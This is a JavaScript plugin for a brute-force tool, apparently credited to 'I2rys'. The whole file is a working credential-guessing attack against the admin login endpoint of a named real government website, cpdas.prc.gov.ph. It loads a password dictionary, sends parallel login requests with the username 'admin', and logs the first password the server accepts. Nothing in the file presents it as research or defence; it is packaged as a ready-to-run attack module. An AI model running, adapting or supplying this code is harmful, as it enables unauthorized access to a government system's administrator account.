// Main
class Plugin {
    constructor(log, info, dependencies){
        this.log = log
        this.platforms = info.platforms
        this.arch = info.arch
        this.fullInfo = info.fullInfo
        this.dependencies = dependencies
    }

    info(){
        return {
            name: "CPDAS Admin Login",
            description: "CPDAS admin login bruteforcer.",
            authors: [
                "I2rys"
            ],
            references: [
                "https://github.com/Original-Psych0/BruteScythe/blob/main/plugins/cpdas.prc.gov.ph.js"
            ],
            platforms: [
                this.platforms.win
            ],
            arch: this.arch.both,
            options: [
                {
                    name: "username",
                    description: "The username to bruteforce.",
                    default: "admin",
                    required: true
                },
                {
                    name: "dictionary",
                    description: "A path of a file that contains a list of passwords.",
                    required: true
                }
            ],
            disclosureDate: "2022-11-14"
        }
    }

    run(args){
        const { runJobs } = this.dependencies.parallelPark
        const request = this.dependencies.request
        const fs = this.dependencies.fs
        const log = this.log

        return new Promise(async(resolve)=>{
            const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

            const password = await runJobs(
                dictionary,
                async(password, index, max)=>{
                    var response = await request.post("https://cpdas.prc.gov.ph/admin/loginAdmin.aspx/logIn", {
                        headers: {
                            "content-type": "application/json"
                        },
                        body: JSON.stringify({ uname: args.username, pword: password })
                    })

                    if(response.body.indexOf("no record found") === -1 && response.statusCode === 200){
                        return password
                    }else{
                        log("i", `Invalid password. ${password}`)
                    }
                }
            )

            password ? log("i", `Valid password found: ${password}`) : log("w", "No valid password found.")

            resolve()
        })
    }
}

module.exports = Plugin